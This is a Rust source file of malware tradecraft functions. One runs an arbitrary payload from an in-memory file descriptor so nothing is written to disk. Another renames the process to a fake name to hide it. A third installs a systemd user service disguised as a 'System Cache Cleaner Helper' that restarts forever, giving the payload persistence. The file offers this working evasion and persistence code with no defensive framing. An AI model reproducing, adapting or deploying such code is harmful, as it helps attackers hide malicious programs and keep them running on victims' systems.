use nix::sys::memfd::{memfd_create, MemFdCreateFlag};
use nix::unistd::execve;
use std::ffi::CString;
use std::fs::File;
use std::io::Write;
use std::os::unix::io::FromRawFd;
use std::os::unix::io::AsRawFd;
use libc::{prctl, PR_SET_NAME};

pub fn reflective_exec(payload: &[u8], fake_name: &str) -> Result<(), Box<dyn std::error::Error>> {
    let name = CString::new("sophia_memfd").unwrap();
    // Fixed: Removed MFD_CLOEXEC so the file descriptor survives execve
    let fd = memfd_create(&name, MemFdCreateFlag::empty())?;

    let raw_fd = fd.as_raw_fd();
    let mut file = unsafe { File::from_raw_fd(raw_fd) };
    file.write_all(payload)?;

    let path = CString::new(format!("/proc/self/fd/{}", raw_fd)).unwrap();
    let argv = vec![CString::new(fake_name).unwrap()];
    let env = vec![CString::new("PATH=/usr/bin:/bin").unwrap()];

    masquerade(fake_name);

    execve(&path, &argv, &env)?;
    Ok(())
}

pub fn masquerade(fake_name: &str) {
    let c_name = CString::new(fake_name).unwrap();
    unsafe {
        prctl(PR_SET_NAME, c_name.as_ptr(), 0, 0, 0);
    }
}

pub fn setup_persistence(service_name: &str, binary_path: &str) -> std::io::Result<()> {
    let home = std::env::var("HOME").expect("HOME not set");
    let systemd_dir = format!("{}/.config/systemd/user", home);
    std::fs::create_dir_all(&systemd_dir)?;

    let service_content = format!(
r#"[Unit]
Description=System Cache Cleaner Helper
After=network.target

[Service]
ExecStart={}
Restart=always

[Install]
WantedBy=default.target
"#, binary_path);

    let service_file = format!("{}/{}.service", systemd_dir, service_name);
    std::fs::write(service_file, service_content)?;

    Ok(())
}
